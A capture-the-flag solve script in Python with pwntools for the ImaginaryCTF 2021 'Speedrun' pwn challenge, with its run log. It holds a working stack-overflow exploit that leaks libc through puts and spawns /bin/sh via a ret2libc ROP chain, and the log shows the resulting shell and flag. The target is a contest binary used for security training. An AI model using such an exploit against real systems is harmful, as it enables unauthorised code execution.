from pwn import *
import base64

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  BINARY = './chal2'
  elf  = ELF(BINARY)
  HOST = "chal.imaginaryctf.org"
  PORT = 42020
  s = remote(HOST, PORT)
  buf_pos       = 0x1149
  pop_rdi_ret   = 0x40120b # pop rdi; ret;
  puts_plt_addr = 0x401030
  libc = ELF('./libc6_2.28-10_amd64.so')
else:
  BINARY = './chal'
  elf  = ELF(BINARY)
  #s = process(BINARY)
  #s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  s = process("python3 speedrun.py", shell=True)
  buf_pos       = 0x1181
  pop_rdi_ret   = 0x401253 # pop rdi; ret;
  puts_plt_addr = 0x401060
  libc = ELF('./libc.so.6')

s.recvuntil("---------------------------BEGIN  DATA---------------------------\n")
r0 = s.recvuntil("\n")[:-1]
r1 = base64.b64decode(r0)
size = u32(r1[buf_pos:buf_pos + 4])
print("size =", size)

buf  = b"A"*(size+8)
buf += p64(pop_rdi_ret)
buf += p64(elf.got.puts)
buf += p64(puts_plt_addr)
buf += p64(elf.sym.main)
s.sendline(buf)

s.recvuntil("Thanks!\n")
puts_addr = u64(s.recvuntil("\n")[:-1] + b"\x00\x00")
libc_base = puts_addr - libc.sym.puts
system_addr = libc_base + libc.sym.system
binsh_addr  = libc_base + next(libc.search(b'/bin/sh'))
print("puts_addr =", hex(puts_addr))
print("libc_base =", hex(libc_base))

buf  = b"A"*(size+8)
buf += p64(pop_rdi_ret+1)
buf += p64(pop_rdi_ret)
buf += p64(binsh_addr)
buf += p64(system_addr)
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200$ python3 solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200/chal2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.imaginaryctf.org on port 42020: Done
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Speedrun_200/libc6_2.28-10_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
size = 576
puts_addr = 0x7f65334a7910
libc_base = 0x7f6533436000
[*] Switching to interactive mode
Thanks!
$ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ ls -l
total 12
-rwxr----- 1 root ctf   42 Jul 12 18:23 flag.txt
-rwxr-x--- 1 root ctf   54 Jul 26 06:09 run.sh
-rwxr-x--- 1 root ctf 2650 Jul 24 07:32 speedrun.py
$ cat flag.txt
ictf{4ut0m4t1ng_expl0it_d3v????_b7d75e95}
'''
